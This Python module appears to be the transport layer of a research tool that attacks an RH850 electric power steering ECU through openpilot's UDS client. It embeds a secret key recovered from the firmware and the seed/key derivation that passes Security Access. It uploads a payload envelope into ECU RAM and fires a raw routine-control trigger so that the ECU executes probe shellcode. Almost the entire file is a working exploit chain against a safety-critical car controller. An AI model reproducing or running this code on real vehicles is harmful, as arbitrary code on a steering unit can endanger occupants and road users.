"""UDS transport layer for the RH850 EPS probe: sessions, SA, upload, trigger.

Drives an ECU through openpilot's ``UdsClient``: the diagnostic-session ladder,
the Security Access seed/key exchange, the envelope upload (RequestDownload +
TransferData + routine auth) and the raw 0xFF00 trigger. The ECU is expected to
execute the probe shellcode and stream the tagged-CRC frames back on
``addr + 8``; ``collect_stream`` reassembles them into a ``StreamResult``.

Hardware access is dependency-injected: ``EcuTransport`` talks to the panda and
the UDS client through a ``bindings`` namespace (see ``load_openpilot_bindings``)
so tests substitute a recording mock and never touch real hardware.
"""

from __future__ import annotations

import hashlib
import struct
import time
from types import SimpleNamespace
from typing import Any, Callable

from Crypto.Cipher import AES

from .protocol import FRAME_END, ProtocolError, StreamCollector, StreamResult

# Secret for the Security Access seed/key derivation (firmware RE).
SEED_KEY_SECRET = bytes.fromhex("f05f36b7d78c03e24ab4faef2a57d044")

# Envelope upload target: RAM staging address and size.
RAM_ADDRESS = 0xFEBF0000
ENVELOPE_LENGTH = 0x1000
CHUNK_SIZE = 0x400

# Raw-trigger parameters (erase-routine style frame, verified variant).
TRIGGER_BASE = 0xE0000
TRIGGER_LENGTH = 0x8000

# DID read for both application and bootloader software identification.
DID_APPLICATION = 0xF181

# Inter-session settle times; the ECU needs to rest between session
# transitions (matches the verified egg-hunter reference).
SESSION_SLEEP = (0.5, 0.7, 1.0)


class TransportError(RuntimeError):
    """The transport could not complete a UDS operation."""


def derive_security_key(seed: bytes, secret: bytes) -> bytes:
    """Derive the Security Access key for a 16-byte seed (AES-128 ECB, double).

    ``intermediate = AES_ECB_decrypt(secret, zeros16)`` then
    ``key = AES_ECB_encrypt(intermediate, seed)`` (firmware RE:
    seed_key_step1_aes_decrypt -> seed_key_step2_aes_encrypt).
    """
    intermediate = AES.new(secret, AES.MODE_ECB).decrypt(bytes(16))
    return AES.new(intermediate, AES.MODE_ECB).encrypt(seed)


def load_openpilot_bindings() -> SimpleNamespace:
    """Lazily import the openpilot/opendbc API surface the transport needs.

    Imported only when the transport is actually opened without injected
    bindings, so this module (and its tests) do not require openpilot.
    """
    from panda import Panda
    from opendbc.car.isotp import isotp_send
    from opendbc.car.structs import CarParams
    from opendbc.car.uds import (
        ACCESS_TYPE,
        ROUTINE_CONTROL_TYPE,
        SERVICE_TYPE,
        SESSION_TYPE,
        UdsClient,
    )

    return SimpleNamespace(
        Panda=Panda,
        UdsClient=UdsClient,
        elm327=CarParams.SafetyModel.elm327,
        session_default=SESSION_TYPE.DEFAULT,
        session_extended=SESSION_TYPE.EXTENDED_DIAGNOSTIC,
        session_programming=SESSION_TYPE.PROGRAMMING,
        access_request_seed=ACCESS_TYPE.REQUEST_SEED,
        access_send_key=ACCESS_TYPE.SEND_KEY,
        service_request_download=SERVICE_TYPE.REQUEST_DOWNLOAD,
        routine_start=ROUTINE_CONTROL_TYPE.START,
        isotp_send=isotp_send,
    )


class EcuTransport:
    def __init__(
        self,
        serial: str | None = None,
        addr: int = 0x7A1,
        bus: int = 0,
        bindings: Any | None = None,
        sleeper: Callable[[float], None] | None = None,
    ):
        self._serial = serial
        self.addr = addr
        self.uds_response_id = addr + 8
        self.bus = bus
        self._bindings = bindings
        self._sleeper = time.sleep if sleeper is None else sleeper
        self.panda: Any | None = None
        self.uds: Any | None = None

    def __enter__(self) -> "EcuTransport":
        return self.open()

    def __exit__(self, exc_type, exc, traceback) -> None:
        self.close()

    def open(self) -> "EcuTransport":
        bindings = self._bindings or load_openpilot_bindings()
        self._bindings = bindings
        self.panda = bindings.Panda(self._serial)
        try:
            self.panda.set_safety_mode(bindings.elm327)
            self.uds = bindings.UdsClient(
                self.panda,
                self.addr,
                self.uds_response_id,
                self.bus,
                timeout=5.0,
                response_pending_timeout=10.0,
            )
        except Exception:
            self.panda.close()
            self.panda = None
            raise
        return self

    def close(self) -> None:
        if self.panda is not None:
            self.panda.close()
        self.panda = None
        self.uds = None

    def _require_open(self) -> tuple[Any, Any, Any]:
        if self._bindings is None or self.panda is None or self.uds is None:
            raise TransportError("transport is not open")
        return self._bindings, self.panda, self.uds

    # --- ECU identity --------------------------------------------------------

    def read_identity(self) -> tuple[bytes, bytes]:
        """Read application F181, climb the session ladder, read boot F181."""
        _bindings, _panda, uds = self._require_open()
        app = bytes(uds.read_data_by_identifier(DID_APPLICATION))
        self.session_ladder()
        boot = bytes(uds.read_data_by_identifier(DID_APPLICATION))
        return app, boot

    # --- Diagnostic sessions -------------------------------------------------

    def session_ladder(self) -> None:
        """DEFAULT -> EXTENDED -> PROGRAMMING with the reference settle sleeps."""
        bindings, _panda, uds = self._require_open()
        for session, settle in (
            (bindings.session_default, SESSION_SLEEP[0]),
            (bindings.session_extended, SESSION_SLEEP[1]),
            (bindings.session_programming, SESSION_SLEEP[2]),
        ):
            uds.diagnostic_session_control(session)
            self._sleeper(settle)

    # --- Security Access -----------------------------------------------------

    def security_access(self) -> bool:
        """Request a 16-byte seed, derive and send the key; True on acceptance.

        ECU refusal (negative response, timeout) returns False so callers can
        degrade gracefully; protocol anomalies raise ``TransportError``.
        """
        bindings, _panda, uds = self._require_open()
        try:
            seed = bytes(uds.security_access(
                bindings.access_request_seed, data_record=bytes(16)
            ))
        except Exception:
            return False
        if len(seed) != 16:
            raise TransportError(
                f"SecurityAccess seed is not 16 bytes (got {len(seed)})"
            )
        key = derive_security_key(seed, SEED_KEY_SECRET)
        try:
            uds.security_access(bindings.access_send_key, security_key=key)
        except Exception:
            return False
        return True

    # --- Payload upload ------------------------------------------------------

    def prepare_and_upload(
        self, envelope: bytes, expected_sha256: str, *, new_uds: bool = False
    ) -> None:
        """Validate the envelope, then write DIDs, download and authenticate.

        The envelope must be exactly 0x1000 bytes and its SHA-256 must match the
        caller-supplied pin before any UDS request is sent.
        """
        bindings, _panda, uds = self._require_open()
        if type(envelope) is not bytes or len(envelope) != ENVELOPE_LENGTH:
            raise TransportError(
                f"payload envelope must be exactly 0x{ENVELOPE_LENGTH:X} bytes, "
                f"got {len(envelope)}"
            )
        if (
            type(expected_sha256) is not str or len(expected_sha256) != 64
            or any(char not in "0123456789abcdef" for char in expected_sha256)
        ):
            raise TransportError("payload SHA-256 pin is malformed")
        if type(new_uds) is not bool:
            raise TransportError("UDS variant flag must be a bool")
        actual_digest = hashlib.sha256(envelope).hexdigest()
        if actual_digest != expected_sha256:
            raise TransportError(
                f"payload SHA-256 mismatch: expected {expected_sha256}, "
                f"got {actual_digest}"
            )

        # State-machine prerequisite writes: 0x203 primes the download, 0x201
        # (key) and 0x202 (IV) feed the envelope decryption (all zeros here).
        uds.write_data_by_identifier(0x203, b"\x00" * 5)
        uds.write_data_by_identifier(0x201, bytes(16))
        uds.write_data_by_identifier(0x202, bytes(16))

        self._download_memory(uds, envelope)
        self._authenticate_envelope(uds, new_uds=new_uds)

    def _download_memory(self, uds: Any, data: bytes) -> None:
        bindings, _panda, active_uds = self._require_open()
        if uds is not active_uds:
            raise TransportError("RequestDownload used an unexpected UDS client")
        request = b"\x01\x46\x01\x00" + struct.pack("!II", RAM_ADDRESS, len(data))
        response = bytes(uds._uds_request(
            bindings.service_request_download, data=request
        ))
        if not response:
            raise TransportError("RequestDownload returned an empty response")
        for offset in range(0, len(data), CHUNK_SIZE):
            uds.transfer_data(offset // CHUNK_SIZE + 1, data[offset:offset + CHUNK_SIZE])
        uds.request_transfer_exit()

    def _authenticate_envelope(self, uds: Any, *, new_uds: bool) -> None:
        bindings, _panda, active_uds = self._require_open()
        if uds is not active_uds:
            raise TransportError("envelope auth used an unexpected UDS client")
        magic = b"\x45\x01" if new_uds else b"\x45\x00"
        option = magic + struct.pack("!II", RAM_ADDRESS, ENVELOPE_LENGTH)
        uds.routine_control(bindings.routine_start, 0x10F0, option)

    def upload_and_trigger(self, envelope: bytes, new_uds: bool) -> None:
        """Upload the envelope (with its own sha256 pin) and fire the trigger."""
        self.prepare_and_upload(
            envelope, hashlib.sha256(envelope).hexdigest(), new_uds=new_uds
        )
        bindings, panda, _uds = self._require_open()
        magic = b"\x45\x01" if new_uds else b"\x45\x00"
        frame = b"\x31\x01\xff\x00" + magic + struct.pack(
            "!II", TRIGGER_BASE, TRIGGER_LENGTH
        )
        bindings.isotp_send(panda, frame, self.addr, bus=self.bus)

    # --- Stream collection ---------------------------------------------------

    def collect_stream(self, timeout: float = 60.0) -> StreamResult:
        """Collect the probe's tagged-CRC stream from the ECU on ``addr + 8``.

        ``03 7F 31 78`` response-pending frames are skipped; any other
        RoutineControl NRC aborts the collection.
        """
        _bindings, panda, _uds = self._require_open()
        if timeout <= 0:
            raise TransportError("stream timeout must be positive")
        collector = StreamCollector()
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            for can_id, data, bus in panda.can_recv():
                if can_id != self.uds_response_id or bus != self.bus:
                    continue
                frame = bytes(data)
                if len(frame) == 8 and frame[0] == 0x03 and frame[1:3] == b"\x7f\x31":
                    if frame[3] == 0x78:
                        continue  # request correctly received, response pending
                    raise TransportError(
                        f"RoutineControl negative response NRC 0x{frame[3]:02X}; "
                        f"raw={frame.hex()}"
                    )
                try:
                    collector.consume(can_id, frame)
                except ProtocolError as exc:
                    raise TransportError(
                        f"invalid payload stream: {exc}; raw={frame.hex()}"
                    ) from exc
                if frame[0] == FRAME_END:
                    return collector.finish()
        raise TransportError(
            f"timed out waiting for payload stream after {timeout:.1f}s"
        )
